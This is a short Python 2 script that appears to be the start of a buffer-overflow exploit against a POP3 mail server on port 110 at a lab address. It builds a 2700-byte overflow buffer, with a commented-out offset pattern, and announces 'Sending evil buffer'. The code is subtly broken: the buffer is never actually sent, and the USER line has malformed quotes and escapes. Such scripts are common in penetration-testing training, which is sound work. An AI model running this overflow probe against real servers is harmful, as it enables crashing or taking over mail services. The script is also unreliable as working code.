#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# buffer = "A"*2606+"B"*4+"C"*90
buffer = 'A' * 2700

try:
  print "\nSending evil buffer..."
  s.connect(('10.11.10.12',110))
  data = s.recv(1024)
  s.send('USER username' +'r\n\')
  print "\nDone!."
except:
  print "Could not connect to POP3!"
  
